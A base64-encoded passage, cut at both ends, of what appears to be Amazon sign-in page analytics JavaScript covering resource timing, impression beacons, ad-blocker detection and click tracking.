l9ydG4gPSAxOwogICAgICAgICAgICAoZnVuY3Rpb24gKGUsIGYpIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGgoYSkgewogICAgICAgICAgICAgICAgICAgIGEgPSBhLnNwbGl0KCI/IilbMF0gfHwgYTsKICAgICAgICAgICAgICAgICAgICBhID0gYS5yZXBsYWNlKCJodHRwOi8vIiwgIiIpLnJlcGxhY2UoImh0dHBzOi8vIiwgIiIpLnJlcGxhY2UoInJlc291cmNlOi8vIiwgIiIpLnJlcGxhY2UoInJlczovLyIsICIiKS5yZXBsYWNlKCJ1bmRlZmluZWQ6Ly8iLCAiIikucmVwbGFjZSgiY2hyb21lOi8vIiwgIiIpLnJlcGxhY2UoL1wqL2csICIiKS5yZXBsYWNlKC8hL2csICIiKS5yZXBsYWNlKC9+L2csICIiKTsKICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IGEuc3BsaXQoIi8iKTsKICAgICAgICAgICAgICAgICAgICBhID0gYS5zdWJzdHIoYS5sYXN0SW5kZXhPZigiLyIpICsgMSk7CiAgICAgICAgICAgICAgICAgICAgYi5zcGxpY2UoLTEpOwogICAgICAgICAgICAgICAgICAgIGIgPSBiLm1hcChmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICBjW2FdIHx8IChjW2FdID0gKGsrKykudG9TdHJpbmcoMzYpKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGNbYV0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICBiLnB1c2goYSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGIuam9pbigiISIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gbCgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZi5nZXRFbnRyaWVzQnlUeXBlKCJyZXNvdXJjZSIpLmZpbHRlcihmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZC5fcnJlKGEpIDwgZC5fbGQKICAgICAgICAgICAgICAgICAgICB9KS5zb3J0KGZ1bmN0aW9uIChhLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEucmVzcG9uc2VFbmQgLSBiLnJlc3BvbnNlRW5kCiAgICAgICAgICAgICAgICAgICAgfSkuc3BsaWNlKDAsIG0pLm1hcChmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IFtdLCBjOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGMgaW4gYSkgZ1tjXSAmJiBhW2NdICYmIGIucHVzaChnW2NdICsgTWF0aC5tYXgoYVtjXSB8IDAsIC0xKS50b1N0cmluZygzNikpOwogICAgICAgICAgICAgICAgICAgICAgICBiLnB1c2goImkiICsgYS5pbml0aWF0b3JUeXBlKTsKICAgICAgICAgICAgICAgICAgICAgICAgKDEgPT0gZC5fcnRuICYmIGQuX2FmanMgPiBuIHx8IDIgPT0gZC5fcnRuKSAmJiBiLnB1c2goIm4iICsgaChhLm5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGIuam9pbigiXyIpCiAgICAgICAgICAgICAgICAgICAgfSkuam9pbigiKiIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcCgpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYSA9ICJwbSIsIGI7CiAgICAgICAgICAgICAgICAgICAgZm9yIChiIGluIGMpIGMuaGFzT3duUHJvcGVydHkoYikgJiYgKGEgKz0gIioiICsgY1tiXSArICJfIiArIGIpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBhCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcSgpIHsKICAgICAgICAgICAgICAgICAgICBkLmxvZyh7azogInJ0aW1pbmciLCB2YWx1ZTogbCgpICsgIn4iICsgcCgpfSwgImNzbSIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKGYgJiYgZi5nZXRFbnRyaWVzQnlUeXBlICYmIEFycmF5LnByb3RvdHlwZS5tYXAgJiYgQXJyYXkucHJvdG90eXBlLmZpbHRlciAmJiBlLnVlICYmIGUudWUubG9nKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGcgPQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uZWN0U3RhcnQ6ICJjIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm5lY3RFbmQ6ICJDIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvbWFpbkxvb2t1cFN0YXJ0OiAiZCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb21haW5Mb29rdXBFbmQ6ICJEIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR1cmF0aW9uOiAieiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGVkQm9keVNpemU6ICJlIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlY29kZWRCb2R5U2l6ZTogIkUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmV0Y2hTdGFydDogImYiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVkaXJlY3RTdGFydDogInIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVkaXJlY3RFbmQ6ICJSIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RTdGFydDogInEiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VTdGFydDogInMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VFbmQ6ICJTIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0VGltZTogImEiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJhbnNmZXJTaXplOiAidCIKICAgICAgICAgICAgICAgICAgICAgICAgfSwgZCA9IGUudWUsIGMgPSB7fSwgayA9IDEsIG4gPSAyMCwgbSA9IDIwMDsKICAgICAgICAgICAgICAgICAgICBkICYmIGQuX3JyZSAmJiAoZC5fYXJ0ID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBkLl9sZCAmJiB3aW5kb3cuc2V0VGltZW91dChxLCAwKQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pKHVlX2NzbSB8fCB7fSwgd2luZG93LnBlcmZvcm1hbmNlKTsKCgogICAgICAgICAgICAoZnVuY3Rpb24gKGMsIGQpIHsKICAgICAgICAgICAgICAgIHZhciBiID0gYy51ZSwgYSA9IGQubmF2aWdhdG9yOwogICAgICAgICAgICAgICAgYiAmJiBiLnRhZyAmJiBhICYmIChhID0gYS5jb25uZWN0aW9uIHx8IGEubW96Q29ubmVjdGlvbiB8fCBhLndlYmtpdENvbm5lY3Rpb24pICYmIGEudHlwZSAmJiBiLnRhZygibmV0SW5mbzoiICsgYS50eXBlKQogICAgICAgICAgICB9KSh1ZV9jc20sIHdpbmRvdyk7CgoKICAgICAgICAgICAgKGZ1bmN0aW9uIChjLCBkKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBoKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBjID0gW10sIGQgPSAwOyBkIDwgYS5sZW5ndGg7IGQrKykgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZSA9IGFbZF0sIGYgPSBiLmVuY29kZShlKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVba10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBnID0gYi5tZXRhU2VwLCBlID0gZVtrXSwgbCA9IGIubWV0YVBhaXJTZXAsIGggPSBbXSwgbSA9IHZvaWQgMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobSBpbiBlKSBlLmhhc093blByb3BlcnR5KG0pICYmIGgucHVzaChtICsgIj0iICsgZVttXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlID0gaC5qb2luKGwpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZiArPSBnICsgZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGMucHVzaChmKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gYy5qb2luKGIucmVzb3VyY2VTZXApCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcyhhKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBhW2tdID0gYVtrXSB8fCB7fTsKICAgICAgICAgICAgICAgICAgICBiW3RdIHx8IChiW3RdID0gYy51ZV9taWQpOwogICAgICAgICAgICAgICAgICAgIGJbdV0gfHwgKGJbdV0gPSBjLnVlX3NpZCk7CiAgICAgICAgICAgICAgICAgICAgYltmXSB8fCAoYltmXSA9IGMudWVfaWQpOwogICAgICAgICAgICAgICAgICAgIGIuY3NtID0gMTsKICAgICAgICAgICAgICAgICAgICBhID0gIi8vIiArIGMudWVfZnVybCArICIvMS8iICsgYVt2XSArICIvMS9PUC8iICsgYVt3XSArICIvIiArIGFbeF0gKyAiLyIgKyBoKFthXSwgeSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKG4pIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG4uY2FsbChkW3BdLCBhKQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYy51ZS5zYmYgPSAxLCAobmV3IEltYWdlKS5zcmMgPSBhCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIChuZXcgSW1hZ2UpLnNyYyA9CiAgICAgICAgICAgICAgICAgICAgICAgIGEKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBxKCkgewogICAgICAgICAgICAgICAgICAgIGcgJiYgZy5pc1N0dWIgJiYgZy5yZXBsYXkoZnVuY3Rpb24gKGEsIGIsIGMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGFbMF07CiAgICAgICAgICAgICAgICAgICAgICAgIGIgPSBhW2tdID0gYVtrXSB8fCB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgYltmXSA9IGJbZl0gfHwgYzsKICAgICAgICAgICAgICAgICAgICAgICAgcyhhKQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIGwuaW1wcmVzc2lvbiA9IHM7CiAgICAgICAgICAgICAgICAgICAgZyA9IG51bGwKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoISgxIDwgYy51ZWluaXQpKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGsgPSAibWV0YWRhdGEiLCB4ID0gImltcHJlc3Npb25UeXBlIiwgdiA9ICJmb3Jlc3RlckNoYW5uZWwiLCB3ID0gInByb2dyYW1Hcm91cCIsCiAgICAgICAgICAgICAgICAgICAgICAgIHQgPSAibWFya2V0cGxhY2VJZCIsIHUgPSAic2Vzc2lvbiIsIGYgPSAicmVxdWVzdElkIiwgcCA9ICJuYXZpZ2F0b3IiLCBsID0gYy51ZSB8fCB7fSwKICAgICAgICAgICAgICAgICAgICAgICAgbiA9IGRbcF0gJiYgZFtwXS5zZW5kQmVhY29uLCByID0gZnVuY3Rpb24gKGEsIGIsIGMsIGQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB7ZW5jb2RlOiBkLCByZXNvdXJjZVNlcDogYSwgbWV0YVNlcDogYiwgbWV0YVBhaXJTZXA6IGN9CiAgICAgICAgICAgICAgICAgICAgICAgIH0sIHkgPSByKCIiLCAiPyIsICImIiwgZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBoKGEuaW1wcmVzc2lvbkRhdGEsIHopCiAgICAgICAgICAgICAgICAgICAgICAgIH0pLCB6ID0gcigiLyIsICI6IiwgIiwiLCBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEuZmVhdHVyZU5hbWUgKyAiOiIgKyBoKGEucmVzb3VyY2VzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEEpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pLCBBID0gcigiLCIsICJAIiwgInwiLCBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEuaWQKICAgICAgICAgICAgICAgICAgICAgICAgfSksIGcgPSBsLmltcHJlc3Npb247CiAgICAgICAgICAgICAgICAgICAgbiA/IHEoKSA6IChsLmF0dGFjaCgibG9hZCIsIHEpLCBsLmF0dGFjaCgiYmVmb3JldW5sb2FkIiwgcSkpOwogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGQuUCAmJiBkLlAucmVnaXN0ZXIgJiYgZC5QLnJlZ2lzdGVyKCJpbXByZXNzaW9uLWNsaWVudCIsIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChCKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGMudWVMb2dFcnJvcihCLCB7bG9nTGV2ZWw6ICJXQVJOIn0pCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KSh1ZV9jc20sIHdpbmRvdyk7CgoKICAgICAgICAgICAgdmFyIHVlX3B0eSA9ICJBdXRoZW50aWNhdGlvblBvcnRhbCI7CgogICAgICAgICAgICB2YXIgdWVfc3B0eSA9ICJTaWduSW5DbGFpbUNvbGxlY3QiOwoKCiAgICAgICAgICAgIHZhciB1ZV9hZGIgPSA0OwogICAgICAgICAgICB2YXIgdWVfYWRiX3J0bGEgPSAxOwogICAgICAgICAgICB1ZV9jc20udWUuZXhlYyhmdW5jdGlvbiAodywgYSkgewogICAgICAgICAgICAgICAgZnVuY3Rpb24gcSgpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoZCAmJiBmKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhOwogICAgICAgICAgICAgICAgICAgICAgICBhOnsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGQuZ2V0SXRlbShnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhayBhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gdm9pZCAwCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGEpIHJldHVybiBiID0gYSwgITAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICExCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcigpIHsKICAgICAgICAgICAgICAgICAgICBiID0gaDsKICAgICAgICAgICAgICAgICAgICBrKCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKGYpIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGQuc2V0SXRlbShnLCBiKQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGEpIHsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcygpIHsKICAgICAgICAgICAgICAgICAgICBiID0gMSA9PT0gYS51ZV9hZGJfY2hrID8gbCA6IGg7CiAgICAgICAgICAgICAgICAgICAgaygpOwogICAgICAgICAgICAgICAgICAgIGlmIChmKSB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBkLnNldEl0ZW0oZywgYikKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChjKSB7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG0oKSB7CiAgICAgICAgICAgICAgICAgICAgYS51ZV9hZGJfcnRsYSAmJiBjICYmIDAgPCBjLmVjICYmICExID09PSBuICYmIChjLmVsaCA9IG51bGwsIHVlTG9nRXJyb3IoewogICAgICAgICAgICAgICAgICAgICAgICBtOiAiSGl0IEluZm8iLAogICAgICAgICAgICAgICAgICAgICAgICBmcm9tT25FcnJvcjogMQogICAgICAgICAgICAgICAgICAgIH0sIHtsb2dMZXZlbDogIklORk8iLCBhZGI6IGJ9KSwgbiA9ICEwKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGsoKSB7CiAgICAgICAgICAgICAgICAgICAgZS50YWcoYik7CiAgICAgICAgICAgICAgICAgICAgZS5pc2wgJiYgYS51ZXggJiYgdWV4KCJhdCIsIGIpOwogICAgICAgICAgICAgICAgICAgIHAgJiYgcC51cGRhdGVDc21IaXQoImFkYiIsIGIpOwogICAgICAgICAgICAgICAgICAgIGMgJiYgMCA8IGMuZWMgPyBtKCkgOiBhLnVlX2FkYl9ydGxhICYmIGMgJiYKICAgICAgICAgICAgICAgICAgICAgICAgKGMuZWxoID0gbSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiB0KCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKGEudWVfYWRiKSB7CiAgICAgICAgICAgICAgICAgICAgYS51ZV9mYWRiID0gYS51ZV9mYWRiIHx8IDEwOwogICAgICAgICAgICAgICAgICAgIHZhciBlID0gYS51ZSwgaCA9ICJhZGJsa195ZXMiLCBsID0gImFkYmxrX25vIiwgYiA9ICJhZGJsa191bmsiLCBkOwogICAgICAgICAgICAgICAgICAgIGE6ewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZCA9IGEubG9jYWxTdG9yYWdlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgYQogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoICh4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZCA9IHZvaWQgMAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB2YXIgZyA9ICJjc206YWRiIiwgYyA9IGEudWVfZXJyLCBwID0gZS5jb29raWUsIGYgPSB2b2lkIDAgIT09IGEubG9jYWxTdG9yYWdlLAogICAgICAgICAgICAgICAgICAgICAgICB1ID0gTWF0aC5yYW5kb20oKSA+IDEgLSAxIC8gYS51ZV9mYWRiLCBuID0gITEsIHYgPSBxKCk7CiAgICAgICAgICAgICAgICAgICAgdSB8fCAhdiA/IGUudWVscygiaHR0cHM6Ly9tLm1lZGlhLWFtYXpvbi5jb20vaW1hZ2VzL0cvMDEvY3NtL3Nob3dhZHMudjIuanMiLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIG9uZXJyb3I6IHIsCiAgICAgICAgICAgICAgICAgICAgICAgIG9ubG9hZDogcwogICAgICAgICAgICAgICAgICAgIH0pIDogaygpOwogICAgICAgICAgICAgICAgICAgIGEudWVfaXNBZGIgPSB0OwogICAgICAgICAgICAgICAgICAgIGEudWVfaXNBZGIudW5rID0gImFkYmxrX3VuayI7CiAgICAgICAgICAgICAgICAgICAgYS51ZV9pc0FkYi5ubyA9IGw7CiAgICAgICAgICAgICAgICAgICAgYS51ZV9pc0FkYi55ZXMgPSBoCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sICJhZGIiKShkb2N1bWVudCwgd2luZG93KTsKCgogICAgICAgICAgICAoZnVuY3Rpb24gKGMsIGwsIG0pIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGgoYSkgewogICAgICAgICAgICAgICAgICAgIGlmIChhKSB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoYS5pZCkgcmV0dXJuICIvLypbQGlkPSciICsgYS5pZCArICInXSI7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiLCBkID0gMSwgZTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChlID0gYS5wcmV2aW91c1NpYmxpbmc7IGU7IGUgPSBlLnByZXZpb3VzU2libGluZykgZS5ub2RlTmFtZSA9PT0gYS5ub2RlTmFtZSAmJiAoZCArPSAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgYiA9IGQ7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBjID0gYS5ub2RlTmFtZTsKICAgICAgICAgICAgICAgICAgICAgICAgMSAhPT0gYiAmJiAoYyArPSAiWyIgKyBiICsgIl0iKTsKICAgICAgICAgICAgICAgICAgICAgICAgYS5wYXJlbnROb2RlICYmIChjID0gaChhLnBhcmVudE5vZGUpICsgIi8iICsgYyk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBjCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZikgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIkRFVEFDSEVEIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBmKGEpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoYSAmJiBhLmdldEF0dHJpYnV0ZSkgcmV0dXJuIGEuZ2V0QXR0cmlidXRlKGspID8gYS5nZXRBdHRyaWJ1dGUoaykgOiBmKGEucGFyZW50RWxlbWVudCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB2YXIgayA9ICJkYXRhLWNlbC13aWRnZXQiLCBnID0gITEsIGQgPSBbXTsKICAgICAgICAgICAgICAgIChjLnVlIHx8IHt9KS5pc0JGID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhID0gSlNPTi5wYXJzZShsb2NhbFN0b3JhZ2VbImNzbS1iZiJdIHx8ICJbXSIpLCBiID0gMCA8PSBhLmluZGV4T2YoYy51ZV9pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGEudW5zaGlmdChjLnVlX2lkKTsKICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGEuc2xpY2UoMCwgMjApOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2VbImNzbS1iZiJdID0gSlNPTi5zdHJpbmdpZnkoYSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBiCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZCkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gITEKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KCk7CiAgICAgICAgICAgICAgICBjLnVlX3V0aWxzID0gewogICAgICAgICAgICAgICAgICAgIGdldFhQYXRoOiBoLCBnZXRGaXJzdEFzY2VuZGluZ1dpZGdldDogZnVuY3Rpb24gKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYy51ZV9jZWwgJiYgYy51ZV9mZW0gPyAhMCA9PT0gZyA/IGIoZihhKSkgOiBkLnB1c2goe2VsZW1lbnQ6IGEsIGNhbGxiYWNrOiBifSkgOiBiKCkKICAgICAgICAgICAgICAgICAgICB9LCBub3RpZnlXaWRnZXRzTGFiZWxlZDogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoITEgPT09IGcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGcgPSAhMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGEgPSBmLCBiID0gMDsgYiA8IGQubGVuZ3RoOyBiKyspIGlmIChkW2JdLmhhc093blByb3BlcnR5KCJjYWxsYmFjayIpICYmIGRbYl0uaGFzT3duUHJvcGVydHkoImVsZW1lbnQiKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBjID0gZFtiXS5jYWxsYmFjaywgZSA9IGRbYl0uZWxlbWVudDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZnVuY3Rpb24iID09PSB0eXBlb2YgYyAmJiAiZnVuY3Rpb24iID09PSB0eXBlb2YgYSAmJiBjKGEoZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gbnVsbAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSwgZXh0cmFjdFN0cmluZ1ZhbHVlOiBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoInN0cmluZyIgPT09CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlb2YgYSkgcmV0dXJuIGEKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pKHVlX2NzbSwgd2luZG93LCBkb2N1bWVudCk7CgoKICAgICAgICAgICAgdWVfY3NtLnVlX3VucnQgPSAxNTAwOwogICAgICAgICAgICAoZnVuY3Rpb24gKGQsIGIsIHQpIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHUoYSwgYikgewogICAgICAgICAgICAgICAgICAgIHZhciBjID0gYS5zcmNFbGVtZW50IHx8IGEudGFyZ2V0IHx8IHt9LAogICAgICAgICAgICAgICAgICAgICAgICBlID0ge2s6IHcsIHQ6IGIudCwgZHQ6IGIuZHQsIHg6IGEucGFnZVgsIHk6IGEucGFnZVksIHA6IGYuZ2V0WFBhdGgoYyksIG46IGMubm9kZU5hbWV9OwogICAgICAgICAgICAgICAgICAgIGEuYnV0dG9uICYmIChlLmIgPSBhLmJ1dHRvbik7CiAgICAgICAgICAgICAgICAgICAgYy50eXBlICYmIChlLnR5ID0gYy50eXBlKTsKICAgICAgICAgICAgICAgICAgICBjLmhyZWYgJiYgKGUuciA9IGYuZXh0cmFjdFN0cmluZ1ZhbHVlKGMuaHJlZikpOwogICAgICAgICAgICAgICAgICAgIGMuaWQgJiYgKGUuaSA9IGMuaWQpOwogICAgICAgICAgICAgICAgICAgIGMuY2xhc3NOYW1lICYmIGMuY2xhc3NOYW1lLnNwbGl0ICYmIChlLmMgPSBjLmNsYXNzTmFtZS5zcGxpdCgvXHMrLykpOwogICAgICAgICAgICAgICAgICAgIGcgKz0gMTsKICAgICAgICAgICAgICAgICAgICBmLmdldEZpcnN0QXNjZW5kaW5nV2lkZ2V0KGMsIGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGUud2QgPSBhOwogICAgICAgICAgICAgICAgICAgICAgICBkLnVlLmxvZyhlLCByKQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24geChhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCF5KGEuc3JjRWxlbWVudCB8fCBhLnRhcmdldCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgayArPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBuID0gITA7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciB2ID0gaCA9IGQudWUuZCgpLCBjOwogICAgICAgICAgICAgICAgICAgICAgICBwICYmICJmdW5jdGlvbiIgPT09IHR5cGVvZiBwLm5vdyAmJiBhLnRpbWVTdGFtcCAmJiAoYyA9IHAubm93KCkgLQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYS50aW1lU3RhbXAsIGMgPSBwYXJzZUZsb2F0KGMudG9GaXhlZCgyKSkpOwogICAgICAgICAgICAgICAgICAgICAgICBzID0gYi5zZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHUoYSwge3Q6IHYsIGR0OiBjfSkKICAgICAgICAgICAgICAgICAgICAgICAgfSwgeikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gQShhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBhLmZpbHRlcihCKTsKICAgICAgICAgICAgICAgICAgICAgICAgYS5sZW5ndGggIT09IGIubGVuZ3RoICYmIChxID0gITAsIGwgPSBkLnVlLmQoKSwgbiAmJiBxICYmIChsICYmIGggJiYgZC51ZS5sb2coewogICAgICAgICAgICAgICAgICAgICAgICAgICAgazogQywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHQ6IGgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtOiBNYXRoLmFicyhsIC0gaCkKICAgICAgICAgICAgICAgICAgICAgICAgfSwgciksIG0oKSwgcSA9ICExLCBsID0gMCkpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIEIoYSkgewogICAgICAgICAgICAgICAgICAgIGlmICghYSkgcmV0dXJuICExOwogICAgICAgICAgICAgICAgICAgIHZhciBiID0gImNoYXJhY3RlckRhd